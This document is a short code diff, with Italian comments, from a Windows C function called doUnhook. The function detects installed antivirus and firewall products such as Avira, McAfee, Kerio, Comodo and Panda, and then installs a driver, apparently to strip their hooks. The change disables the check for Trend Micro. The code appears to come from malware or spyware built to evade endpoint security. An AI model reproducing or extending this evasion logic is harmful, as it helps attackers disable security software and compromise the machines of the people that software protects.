@@ -787,7 +787,7 @@ BOOL doUnhook()
 
 	// Se siamo su XP con Kaspersky o McAfee o Kerio
 	// e non c'e' il driver, allora prova l'installazione
-	if ((IsAvira() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsAshampoo() || IsEndPoint()) && !IsVista(&dummy) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
+	if ((IsAvira() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || /*IsTrend() ||*/ IsAshampoo() || IsEndPoint()) && !IsVista(&dummy) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
 		WCHAR drv_path[DLLNAMELEN*2];
 		
 		// Copia il driver nella directory di destinazione dalla TMP (solo online)
